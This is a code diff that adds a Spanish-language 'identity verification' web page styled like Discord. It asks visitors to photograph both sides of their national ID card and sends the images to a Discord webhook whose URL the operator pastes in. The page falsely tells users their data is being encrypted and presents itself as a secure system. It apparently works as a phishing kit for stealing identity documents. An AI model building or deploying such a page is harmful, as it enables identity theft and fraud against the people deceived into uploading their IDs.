@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verificación de Identidad</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        :root {
+            --primary: #5865F2; /* Color principal estilo Discord */
+            --primary-dark: #4752C4;
+            --bg: #f0f2f5;
+            --text-dark: #1e293b;
+            --text-gray: #64748b;
+            --card-bg: #ffffff;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: var(--text-dark);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* --- Contenedor Principal --- */
+        .card-container {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 480px;
+            padding: 2.5rem 2rem;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+        }
+
+        header { text-align: center; margin-bottom: 2.5rem; }
+        
+        /* --- Estilos del Logo --- */
+        .logo-container {
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: center;
+        }
+        .top-logo {
+            max-height: 60px; /* Ajusta la altura máxima de tu logo aquí */
+            width: auto;
+            display: block;
+        }
+
+        header h1 { font-size: 1.6rem; font-weight: 700; margin-bottom: 0.5rem; }
+        header p { color: var(--text-gray); font-size: 0.95rem; }
+
+        /* --- Secciones de Carga --- */
+        .upload-section { margin-bottom: 2rem; }
+        
+        .label-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .upload-label { font-weight: 600; font-size: 1rem; }
+        
+        /* Indicadores de calidad animados */
+        .quality-tips {
+            display: flex;
+            gap: 12px;
+            font-size: 0.75rem;
+            color: var(--primary);
+            font-weight: 500;
+        }
+        .tip-item { display: flex; align-items: center; gap: 4px; }
+        .tip-icon-pulse { animation: pulse 2s infinite ease-in-out; }
+
+        @keyframes pulse {
+            0% { opacity: 0.6; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.1); }
+            100% { opacity: 0.6; transform: scale(1); }
+        }
+
+        /* Zona de "Drop" */
+        .drop-zone {
+            border: 2px dashed #cbd5e1;
+            border-radius: 16px;
+            padding: 25px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            background: #f8fafc;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .drop-zone:hover, .drop-zone.active {
+            border-color: var(--primary);
+            background: #eef2ff;
+            transform: translateY(-2px);
+        }
+
+        .drop-content i { color: var(--primary); margin-bottom: 12px; }
+        .drop-text-main { font-weight: 500; color: var(--text-dark); margin-bottom: 4px; }
+        .drop-text-sub { font-size: 0.85rem; color: var(--text-gray); }
+        
+        /* Estado de archivo seleccionado */
+        .file-selected-badge {
+            display: none; /* Oculto por defecto */
+            margin-top: 15px;
+            background: #dcfce7;
+            color: #166534;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        input[type="file"] { display: none; }
+
+        /* --- Botón --- */
+        .btn-main {
+            width: 100%;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 4px 12px rgba(88, 101, 242, 0.3);
+        }
+
+        .btn-main:hover { background-color: var(--primary-dark); transform: translateY(-2px); }
+        .btn-main:active { transform: translateY(0); }
+        
+        #error-message {
+            color: #ef4444;
+            text-align: center;
+            margin-bottom: 1rem;
+            font-weight: 500;
+            display: none;
+            background: #fee2e2;
+            padding: 10px;
+            border-radius: 8px;
+        }
+
+        /* --- PANTALLA DE CARGA (Overlay) --- */
+        .loading-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .loading-overlay.active { visibility: visible; opacity: 1; }
+
+        .spinner {
+            width: 50px; height: 50px;
+            border: 4px solid rgba(88, 101, 242, 0.2);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-text { font-weight: 600; color: var(--text-dark); font-size: 1.1rem; }
+
+    </style>
+</head>
+<body>
+
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <p class="loading-text">Encriptando y enviando...</p>
+    <p style="color: var(--text-gray); font-size: 0.9rem; margin-top: 8px;">Por favor no cierres esta ventana.</p>
+</div>
+
+<div class="card-container">
+    <header>
+        <div class="logo-container">
+            <img src="logo.png" alt="Logo de la Empresa" class="top-logo" onerror="this.style.display='none'">
+        </div>
+        <h1>Verificación de Identidad</h1>
+        <p>Necesitamos una foto clara de tu cédula para continuar.</p>
+    </header>
+
+    <div id="error-message"></div>
+
+    <div class="upload-section">
+        <div class="label-header">
+            <label class="upload-label">Parte Frontal</label>
+            <div class="quality-tips">
+                 <div class="tip-item"><i data-lucide="sun" size="14" class="tip-icon-pulse"></i> Buena Luz</div>
+                 <div class="tip-item"><i data-lucide="eye" size="14" class="tip-icon-pulse"></i> Legible</div>
+            </div>
+        </div>
+        
+        <div class="drop-zone" onclick="document.getElementById('frontal').click()">
+            <div class="drop-content" id="content-frontal">
+                <i data-lucide="camera" size="40" stroke-width="1.5"></i>
+                <p class="drop-text-main">Tocar para usar cámara</p>
+                <p class="drop-text-sub">o selecciona de la galería</p>
+            </div>
+             <div id="badge-frontal" class="file-selected-badge">
+                <i data-lucide="check-circle-2" size="16"></i> Foto Frontal lista
+            </div>
+        </div>
+        <input type="file" id="frontal" accept="image/*" capture="environment">
+    </div>
+
+    <div class="upload-section">
+         <div class="label-header">
+            <label class="upload-label">Parte Trasera</label>
+             <div class="quality-tips">
+                 <div class="tip-item"><i data-lucide="sun" size="14" class="tip-icon-pulse"></i> Buena Luz</div>
+                 <div class="tip-item"><i data-lucide="eye" size="14" class="tip-icon-pulse"></i> Legible</div>
+            </div>
+        </div>
+        <div class="drop-zone" onclick="document.getElementById('posterior').click()">
+             <div class="drop-content" id="content-posterior">
+                <i data-lucide="camera" size="40" stroke-width="1.5"></i>
+                <p class="drop-text-main">Tocar para usar cámara</p>
+                <p class="drop-text-sub">o selecciona de la galería</p>
+            </div>
+            <div id="badge-posterior" class="file-selected-badge">
+                <i data-lucide="check-circle-2" size="16"></i> Foto Trasera lista
+            </div>
+        </div>
+        <input type="file" id="posterior" accept="image/*" capture="environment">
+    </div>
+
+    <button id="btnEnviar" class="btn-main">
+        <i data-lucide="shield-check" size="22"></i>
+        Enviar Verificación
+    </button>
+</div>
+
+<script>
+    lucide.createIcons();
+
+    // --- CONFIGURACIÓN ---
+    const WEBHOOK_URL = 'TU_URL_DE_WEBHOOK_AQUI'; // <--- ¡PEGA TU URL AQUÍ!
+    const REDIRECT_URL = 'espera.html'; // Nombre del archivo de espera
+
+    // Función para mostrar feedback visual al seleccionar archivo
+    function setupFileInput(inputId, badgeId, contentId) {
+        const input = document.getElementById(inputId);
+        const badge = document.getElementById(badgeId);
+        const content = document.getElementById(contentId);
+
+        input.addEventListener('change', function(e) {
+            if (this.files && this.files[0]) {
+                // Mostrar badge verde y ocultar textos iniciales
+                badge.style.display = 'flex';
+                content.style.opacity = '0.3';
+                // Opcional: Vibrar en móviles si está soportado
+                if (navigator.vibrate) navigator.vibrate(50);
+            }
+        });
+    }
+
+    setupFileInput('frontal', 'badge-frontal', 'content-frontal');
+    setupFileInput('posterior', 'badge-posterior', 'content-posterior');
+
+    const errorBox = document.getElementById('error-message');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    document.getElementById('btnEnviar').addEventListener('click', async () => {
+        const frontal = document.getElementById('frontal').files[0];
+        const posterior = document.getElementById('posterior').files[0];
+
+        errorBox.style.display = 'none';
+
+        if (!frontal || !posterior) {
+            errorBox.innerText = "⚠️ Por favor, asegúrate de tomar ambas fotos.";
+            errorBox.style.display = 'block';
+            // Pequeña animación de "shake" para el error
+            errorBox.animate([{ transform: 'translateX(-5px)' }, { transform: 'translateX(5px)' }, { transform: 'translateX(0)' }], { duration: 200, iterations: 2 });
+            return;
+        }
+
+        // ACTIVA PANTALLA DE CARGA
+        loadingOverlay.classList.add('active');
+
+        const formData = new FormData();
+        formData.append('file1', frontal, `F-${Date.now()}.jpg`);
+        formData.append('file2', posterior, `P-${Date.now()}.jpg`);
+        
+        // Embed más profesional para Discord
+        const embedPayload = {
+            embeds: [{
+                title: "🛡️ Nueva Solicitud de Verificación",
+                description: "Se han recibido documentos de identidad para revisión manual.",
+                color: 5793266, // Un tono verde azulado
+                fields: [
+                    { name: "Estado", value: "Pendiente de revisión", inline: true },
+                    { name: "Dispositivo", value: /Mobi|Android/i.test(navigator.userAgent) ? "📱 Móvil" : "💻 PC", inline: true }
+                ],
+                footer: { text: "Sistema Seguro ID v2.0" },
+                timestamp: new Date().toISOString()
+            }]
+        };
+        formData.append('payload_json', JSON.stringify(embedPayload));
+
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (response.ok) {
+                // ÉXITO: Esperar 1 segundo para que se vea la animación y REDIRIGIR
+                setTimeout(() => {
+                     window.location.href = REDIRECT_URL;
+                }, 1000);
+            } else {
+                throw new Error('Error en respuesta del servidor');
+            }
+        } catch (error) {
+            // ERROR: Quitar pantalla de carga y mostrar error
+            loadingOverlay.classList.remove('active');
+            errorBox.innerText = "❌ Error de conexión. Inténtalo de nuevo en unos segundos.";
+            errorBox.style.display = 'block';
+            console.error(error);
+        }
+    });
+</script>
+
+</body>
+</html>
